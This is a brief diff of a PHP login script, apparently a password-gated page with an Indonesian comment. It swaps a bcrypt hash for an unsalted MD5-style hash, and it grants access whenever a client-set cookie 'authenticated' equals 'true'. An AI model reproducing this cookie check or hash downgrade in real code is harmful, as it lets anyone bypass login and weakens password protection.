@@ -1,6 +1,6 @@
 
 <?php
-$pass_hash = '$2y$10$mIGmh4kf2iMB8eht0SdtheeczwzbeuKnqgIM2X7nWQeWdEGG2Cku6';
+$pass_hash = '0712b2b5ca9b8d8e387e0efcbc45c403';
 
 // Cek cookie login
 if (isset($_COOKIE['authenticated']) && $_COOKIE['authenticated'] === 'true') {
